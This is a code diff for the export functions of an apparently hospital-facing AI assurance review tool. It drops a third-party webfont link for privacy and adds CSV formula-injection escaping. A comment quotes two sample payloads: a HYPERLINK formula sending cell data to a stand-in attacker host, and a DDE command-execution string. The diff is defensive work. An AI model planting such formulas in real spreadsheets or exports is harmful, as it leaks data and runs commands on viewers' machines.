@@ -13,7 +13,13 @@ ${css}`;
 function exportHTML(){
   return `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
 <title>${esc(S.meta.solution||"AI solution")} – CHAI assurance review</title>
-<link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@62..125,400..900&family=Public+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<!-- No webfont link. The exported report is the artifact that gets emailed
+     around a hospital and opened on clinical workstations, and a stylesheet
+     link meant every one of those opens contacted a third party, carrying the
+     referrer and the viewer's address, from a document containing vendor
+     assessments and clinical rationale. STANDALONE_CSS() goes to real trouble
+     to inline everything else; this was the one hole left in it. The font
+     stacks below end in system-ui. -->
 <style>${STANDALONE_CSS()}</style></head><body><main class="report">${reportBody(true)}</main></body></html>`;
 }
 /* PDF, via the browser's own print-to-PDF.
@@ -94,8 +100,33 @@ function projectJSON(p){
     _state:state
   };
 }
+/* One CSV field, quoted and defanged.
+
+   RFC 4180 quoting is not enough here. Excel, LibreOffice and Google Sheets
+   all treat a cell beginning with =, +, - or @ as a FORMULA, inside quotes or
+   not, so a project named
+
+     =HYPERLINK("https://evil.example/?x="&A1,"Review status")
+
+   becomes a live link in every committee member's copy of the portfolio
+   export. =cmd|'/c calc'!A0 is the DDE variant. The portfolio CSV exists
+   specifically to be opened in a spreadsheet, and any writer on any single
+   project controls one of its cells.
+
+   A leading apostrophe makes the spreadsheet treat the rest as literal text.
+   It is visible in the formula bar and not in the cell, which is the least
+   intrusive fix that actually works. Leading tab and carriage return are
+   included because they slip past a naive check on the first character and
+   still leave a formula behind. */
+const CSV_FORMULA = /^[=+\-@\t\r]/;
+function csvField(value){
+  let text = String(value ?? "");
+  if(CSV_FORMULA.test(text)) text = "'" + text;
+  return `"${text.replace(/"/g,'""')}"`;
+}
+
 function exportCSV(){
-  const q=v=>`"${String(v??"").replace(/"/g,'""')}"`;
+  const q=csvField;
   const head=["Project","Developer","Clinical sponsor","Risk tier","Lifecycle phase","Status","Readiness %","Next review","Flags","Archived","Last updated"];
   const rows=dashData().map(r=>[r.p.meta.solution,r.p.meta.developer,r.p.meta.sponsor,r.p.meta.riskTier,phase(r.p).label,r.st.label,r.score,r.nr||"",r.f.map(f=>f.text).join("; "),r.p.archived?"yes":"",(r.p.updatedAt||"").slice(0,10)]);
   return [head,...rows].map(r=>r.map(q).join(",")).join("\r\n");
